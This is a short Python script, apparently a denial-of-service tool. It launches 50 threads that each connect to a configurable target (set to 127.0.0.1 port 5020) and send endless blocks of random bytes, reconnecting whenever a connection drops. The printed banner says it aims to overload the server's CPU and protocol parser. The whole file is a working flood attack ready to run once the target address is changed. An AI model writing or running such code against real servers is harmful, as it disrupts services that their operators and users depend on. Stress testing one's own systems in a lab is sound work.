import socket
import threading
import random
import time

# CONFIGURATION
TARGET_IP = '127.0.0.1'
TARGET_PORT = 5020

def garbage_flood():
    while True:
        try:
            # 1. Connect
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((TARGET_IP, TARGET_PORT))
            
            # 2. BLAST GARBAGE DATA
            # Send 1024 bytes of random junk repeatedly, this forces the server to try and understand "gibberish"
            random_bytes = bytearray(random.getrandbits(8) for _ in range(1024))
            
            while True:
                s.send(random_bytes)
                                
        except Exception:
            # If connection breaks, restart immediately
            pass

print(f"[*] Starting GARBAGE FLOOD on {TARGET_IP}")
print("[*] This targets the CPU and Protocol Parser.")

# Launch 50 threads of chaos
for i in range(50):
    t = threading.Thread(target=garbage_flood)
    t.start()